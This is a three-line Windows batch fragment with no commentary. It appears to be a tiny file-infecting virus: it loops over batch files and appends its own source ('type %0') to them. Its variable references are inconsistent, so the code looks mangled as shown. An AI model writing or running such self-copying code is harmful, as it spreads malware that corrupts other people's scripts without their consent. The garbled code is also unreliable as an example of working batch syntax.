for %%i in (*.b*) do set =%%i
find "" %w
if errorlevel 2 type %0>>%%